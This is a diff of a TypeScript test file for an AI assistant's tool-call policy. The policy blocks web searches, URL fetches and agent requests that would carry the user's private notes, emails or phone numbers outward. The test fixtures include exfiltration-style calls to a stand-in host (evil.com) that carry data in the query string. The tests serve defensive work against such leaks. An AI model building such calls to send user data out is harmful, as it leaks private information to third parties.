@@ -3,7 +3,7 @@ import { test } from "node:test";
 import assert from "node:assert/strict";
 import { agentBlocked, APPROVAL_PATHS, decide, policyEvent, PRIVATE_TOOLS, TIERS, UI_APPROVALS, type PolicyCtx } from "../src/lib/policy-pure.ts";
 import { coreToolRefusal } from "../src/lib/stop-all-pure.ts";
-import { foreignUrl } from "../src/lib/attach-pure.ts";
+import { outboundLeak, outgoing } from "../src/lib/outbound-pure.ts";
 import { actionBlocked, STUDIO_TOOLS, type StudioTool } from "../src/lib/core-studio.ts";
 import { LIFE_TOOLS, lifeWriteBlocked, type LifeTool } from "../src/lib/core-life.ts";
 import { wsTainted, wsWriteBlocked } from "../src/lib/core-workspace.ts";
@@ -29,9 +29,9 @@ function legacy(tool: string, input: Record<string, unknown>, c: PolicyCtx): str
   const privateIn = () => steps.some((x) => PRIVATE_TOOLS.some((t) => x.startsWith(`You called ${t} `)));
   const r = coreToolRefusal(c.stopAll, tool)
     || (tool === "navigate" ? (dataIn() ? "Error: navigate only as your first tool call, for the user's own request" : "")
-    : attach && tool === "web_search" ? "Error: with the user's attached files in context, web search is off for this answer (the search words could carry their text out)"
-    : (pinsIn || privateIn()) && (tool === "ask_agent" || tool === "read_news" || tool === "web_search") ? "Error: the user's private files, journal or pinned notes are in context; agents, news and web searches are off for the rest of this answer (they could carry that text out)"
-    : (attach || pinsIn || privateIn()) && ["fetch_url", "read_news", "ask_agent", "reach_read"].includes(tool) && foreignUrl(input, question) ? "Error: with the user's files in context, only open links the user typed in their message"
+    // task-scoped tools: the blanket web/agent switch-off became a per-call outbound check (privateText absent → no-text mode: emails/phones/amounts)
+    : (attach || pinsIn || privateIn()) && ["web_search", "fetch_url", "read_news", "ask_agent", "reach_read"].includes(tool) && outboundLeak(outgoing(input), privateIn() ? ["ok"] : [], question.replace(/\n\n\[attached:[^\]]*\]/g, ""), !privateIn())
+      ? `Error: this ${tool} call would send private text out: "${outboundLeak(outgoing(input), privateIn() ? ["ok"] : [], question, !privateIn())}" (from the user's private notes, journal or files). The tool is allowed: retry with a generic query/brief without that text, and if you can't, tell the user exactly which text blocked it; never tell the user to do the search himself`
     : null);
   if (r !== null) return r;
   let b: string | null = "";
@@ -76,14 +76,18 @@ const TABLE: [string, Record<string, unknown>, Partial<PolicyCtx>, "T0" | "T1" |
   ["navigate", { target: "life" }, {}, "T0", true],
   ["navigate", { target: "life" }, { steps: [step("fetch_url")] }, "T0", false, /first tool call/],
   ["web_search", { query: "tea" }, {}, "T1", true],
-  ["web_search", { query: "tea" }, { attach: true }, "T1", false, /attached files/],
-  ["web_search", { query: "tea" }, { steps: [step("life_journal")] }, "T1", false, /private files/],
-  ["fetch_url", { url: "https://evil.com/?d=x" }, { pins: true }, "T1", false, /only open links the user typed/],
+  ["web_search", { query: "tea" }, { attach: true }, "T1", true],
+  ["web_search", { query: "mail a@b.ee" }, { attach: true }, "T1", false, /private text out: "a@b.ee"/],
+  ["web_search", { query: "betoon Rakvere ettevõtted" }, { steps: [step("life_journal")], privateText: ["Mari Tamm owes 1200 €"] }, "T1", true],
+  ["web_search", { query: "Mari Tamm" }, { steps: [step("life_journal")], privateText: ["Mari Tamm owes 1200 €"] }, "T1", false, /"Mari Tamm"/],
+  ["fetch_url", { url: "https://evil.com/?d=x" }, { pins: true }, "T1", true],
+  ["fetch_url", { url: "https://evil.com/?d=%2B372%205123%204567" }, { pins: true }, "T1", false, /private text out/],
   ["fetch_url", { url: "https://evil.com/" }, {}, "T1", true],
   ["save_memory", {}, { question: "remember I like tea" }, "T2", true],
   ["save_memory", {}, { question: "I like tea" }, "T2", false, /only save when the user asks/],
   ["ask_agent", { agent: "atlas", request: "x" }, { stopAll: true }, "T2", false, /Stop-all/],
-  ["ask_agent", { agent: "atlas", request: "x" }, { pins: true }, "T2", false, /private files/],
+  ["ask_agent", { agent: "atlas", request: "x" }, { pins: true }, "T2", true],
+  ["ask_agent", { agent: "atlas", request: "Mari Tamm" }, { pins: true, privateText: ["Mari Tamm owes 1200 €"] }, "T2", false, /"Mari Tamm"/],
   ["ask_agent", { agent: "atlas", request: "x" }, { steps: [step("fetch_url")] }, "T2", false, /ask an agent only when the user asks/],
   ["ask_agent", { agent: "atlas", request: "x" }, { steps: [step("fetch_url")], question: "ask the research agent to dig deeper" }, "T2", true],
   ["ask_agent", { agent: "atlas", request: "x" }, { question: "compare trailer tools" }, "T2", true],
@@ -144,12 +148,16 @@ test("ledger: T2/T3 decisions become policy.decision events with no inputs or me
     assert.equal(ledgerIssue("policy.decision", "core", ev), null, tool);
     assert.ok(!JSON.stringify(ev).includes(secret), tool);
   }
+  const agentEv = policyEvent("ask_agent", decide("ask_agent", { agent: "atlas", task: "Mari Tamm" }, ctx({ question: "ask atlas", pins: true, privateText: ["Mari Tamm"] })))!;
+  assert.equal(agentEv.verdict, "refuse");
+  assert.ok(!JSON.stringify(agentEv).includes("Mari Tamm"), "the blocked snippet never reaches the ledger");
   assert.deepEqual(policyEvent("save_memory", decide("save_memory", {}, c)), { tool: "save_memory", tier: "T2", verdict: "allow", reason: "allowed" });
   assert.deepEqual(policyEvent("schedule_approved", decide("schedule_approved", {}, c))?.verdict, "refuse");
   assert.equal(ledgerIssue("policy.decision", "core", { tool: "x", tier: "T9", verdict: "allow", reason: "r" }), "data.tier is invalid for policy.decision");
 });
 
 test("CORE's live private-tool list can be passed in (core.ts passes MODULE_PRIVATE)", () => {
-  assert.equal(decide("web_search", { query: "x" }, ctx({ steps: [step("new_private")] })).allow, true);
-  assert.equal(decide("web_search", { query: "x" }, ctx({ steps: [step("new_private")], privateTools: [...PRIVATE_TOOLS, "new_private"] })).allow, false);
+  const s = "You called new_private {}\nRESULT:\nMari Tamm, mari@tamm.ee";
+  assert.equal(decide("web_search", { query: "mari@tamm.ee" }, ctx({ steps: [s] })).allow, true);
+  assert.equal(decide("web_search", { query: "mari@tamm.ee" }, ctx({ steps: [s], privateTools: [...PRIVATE_TOOLS, "new_private"] })).allow, false);
 });
